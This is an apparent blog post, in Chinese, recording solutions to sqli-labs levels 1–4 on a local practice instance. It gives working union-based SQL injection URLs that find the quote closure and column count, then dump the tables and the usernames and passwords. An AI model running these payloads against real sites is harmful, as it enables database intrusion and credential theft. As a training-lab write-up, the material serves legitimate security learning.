---
layout:     post                    # 使用的布局（不需要改）
title:      sqli-labs做题记录               # 标题 
subtitle:   Basic Challenges #副标题
date:       2019-08-15              # 时间
author:     Von                      # 作者
header-img: img/post-bg-mma-5.jpg    #这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               #标签
    - Web
    - SQL

---

# 前言
这几天也算是为了记录自己的成长过程来更新sqli-labs的做题记录。不知道能不能更完，毕竟总共有75关。不管怎么样，努力做到不咕吧。  
受限于篇幅设置，我对于每一关的原理肯定没有办法讲得特别详细，但我会尽量讲得通俗易懂，并且给出相应的参考文章。  
同时，对于类型相同的题目，我尽量给出不同的解法，来充实，提高自己。  

# Less-1

这题的考点是union联合查询注入。
对于这种类型，我推荐小白可以去看看这两篇文章。  
[文章1](https://zhuanlan.zhihu.com/p/22397455)      [文章2](https://zhuanlan.zhihu.com/p/22397620)   
我们先来判断注入类型。  
```
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=1 --+
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=2 --+
```
经这两者判断，第一种传入网站显示正常，第二种传入网站显示不正常。可以看出我们的语句已经被执行。因此说明是单引号类型注入。
先判断字段数。依次递增order by 后面的数值。
```
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' order by 1 --+
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' order by 2 --+
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' order by 3 --+
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' order by 4 --+
```
发现3时不报错,而4时报错，所以字段数是3。  
接下来用联合查询判断显示位。首先我们要让id变成一个不存在的值以便显示出来的值都是union语句执行的结果。在这里我们使用100。
```
http://127.0.0.1/sqli-labs-master/Less-1/?id=100' union select 1,2,3 --+
```
![](http://VonLYC.github.io/img/blog9-1.png)
可以看出,显示位为2和3。接下来便是常规操作：
```
爆库:http://127.0.0.1/sqli-labs-master/Less-1/?id=100' union select 1,2,database() --+
爆表:http://127.0.0.1/sqli-labs-master/Less-1/?id=100' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
爆字段:http://127.0.0.1/sqli-labs-master/Less-1/?id=100' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' --+
爆值:http://127.0.0.1/sqli-labs-master/Less-1/?id=100' union select 1,2,group_concat(username,0x3a,password,0x3c2f62723e) from security.users --+
```
至此，一次sql注入便完成了。

# Less-2
这道题和上面那道其实很类似。
```
http://127.0.0.1/sqli-labs-master/Less-1/?id=1 and 1=1 --+
http://127.0.0.1/sqli-labs-master/Less-1/?id=1 and 1=2 --+
```
第一种传入网站显示正常，第二种传入网站显示不正常。可以看出我们的语句已经被执行。因此说明是数值类型注入。  
之后的注入类型与Less-1雷同(仅需把单引号去掉而已)。不再赘述。

# Less-3
我们先传入id=1',可以得到这样的报错信息。
```
 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1 
```
![](http://VonLYC.github.io/img/blog9-2.png)
由此看出，我们需要闭合').
```
http://127.0.0.1/sqli-labs-master/Less-1/?id=1') and 1=1 --+
http://127.0.0.1/sqli-labs-master/Less-1/?id=1') and 1=2 --+
```
经同上面的判断，可以看出代码已被执行。之后的注入过程雷同Less-1.

# Less-4
我们传入id=1"，可以得到这样的报错信息。
```
 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"") LIMIT 0,1' at line 1  
```
![](http://VonLYC.github.io/img/blog9-3.png)
由此看出，我们需要闭合")。之后的过程类似Less-1.

---
由此看出，这四题主要区别就是在闭合符号的区别，实际应用中我们一方面可以通过报错信息来判断需要闭合的符号。也可以采用burp suite跑字典来进行Fuzz。
---

# Less-5







